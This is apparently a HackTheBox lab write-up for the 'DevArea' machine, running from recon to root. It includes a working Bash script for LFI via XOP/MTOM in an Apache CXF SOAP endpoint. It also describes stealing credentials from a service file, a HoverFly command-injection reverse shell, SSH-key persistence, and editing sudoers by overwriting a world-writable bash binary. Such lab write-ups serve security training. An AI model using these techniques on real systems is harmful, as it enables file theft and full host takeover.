# HackTheBox DevArea Full Chain Penetration Testing

## External Reconnaissance and Web Entry
	Network Mapping: Nmap scan of `10.129.18.149` leading to `devarea.htb` identification
	Nmap scan identifying Jetty 9.4.27 (port 8080) and an FTP server with anonymous access.
## Data Exfiltration and Service Identification
	Downloaded `employee-service.jar` from the FTP server for static analysis.
	Identification of Apache CXF framework and discovery of a SOAP endpoint.
## Exploitation and Data Exfiltration CVE-2019-17638
	LFI via XOP/MTOM: Exploited Local File Inclusion vulnerability in the SOAP service using a custom Bash script.
	`
		#!/bin/bash
		if [ -z "$1" ]; then
		echo "Usage $0 /path/to/file"
		fi
		
		result=$(curl -s -X POST http://devarea.htb:8080/employeeservice -H "Content-Type: multipart/related; \
		type=\"text/xml\"; start=\"<root>\"; boundary=\"boundary\"" --data-binary @- <<EOF
		--boundary
		Content-Type: text/xml; charset=UTF-8
		Content-ID: <root>
		<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
		<soapenv:Header/>
		<soapenv:Body>
		<dev:submitReport>
		<arg0>
		<confidential>false</confidential>
		<content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://$1"/></content>
		<department>IT</department>
		<employeeName>Exploit</employeeName>
		</arg0>
		</dev:submitReport>
		</soapenv:Body>
		</soapenv:Envelope>
		--boundary--
		EOF
		)
		
		echo -e "\n ========================\n"
		echo "$result" | sed -n 's/.*Content: \(.*\)<\/return>.*/\1/p' | tr -d '[:space:]' | base64 -d		
	`
	Credential Leakage: Read `/etc/systemd/system/hoverfly.service` which revealed cleartext credentials for the HoverFly admin panel.

## CVE-2025-54123
	Leveraged a Command Injection vulnerability in HoverFly, which allows using a public GitHub exploit to generate a reverse shell.

## Lateral Movement
	Established persistence by adding an SSH key to `authorized_keys`, allowing stable access as user `dev_ryan`.
## System Enumeration and Analysis
	 User Flag Recovery:
	Gained an interactive SSH session and retrieved the contents of `user.txt`.
	Source Code Discovery:
	Located and extracted `syswatch-v1.zip` in the home directory, containing the source code for administrative tools.
## Sudo Analytics
	Identified `sudo -l` permissions for `/opt/syswatch/syswatch.sh` with specific restrictions on `web-stop` and `web-restart` commands.
	Privilege Escalation: Weak Binary Permissions Hijacking
	Insecure Permissions Identification: 
	Discovered that `/usr/bin/bash` had world-writable permissions (`777`), allowing direct modification of the system shell.
	Bash Hijacking via Sudo Trigger:
	Created a malicious payload in `/tmp/file` designed to append a passwordless sudo entry for `dev_ryan` to `/etc/sudoers`.
	Execution and Bypass:
	Executed `exec /usr/bin/dash` to free the `/usr/bin/bash` binary from the current process lock.
	Backed up the original shell with `cp /usr/bin/bash /tmp/bash_backup` and successfully overwrote the binary after privilege escalation.
## Privilege Escalation:
	Ran `sudo /opt/syswatch/syswatch.sh help`. Since the script uses `#!/bin/bash`, it triggered the malicious payload with root privileges.
	Vertical Escalation:
	Verified root access with `sudo -l`, confirming the addition of `(ALL : ALL) NOPASSWD: ALL`.
	System Restoration:
	Restored the original bash binary using `cat /tmp/bash_backup > /usr/bin/bash` to stabilize the environment and gained a persistent root shell via `sudo su -`.
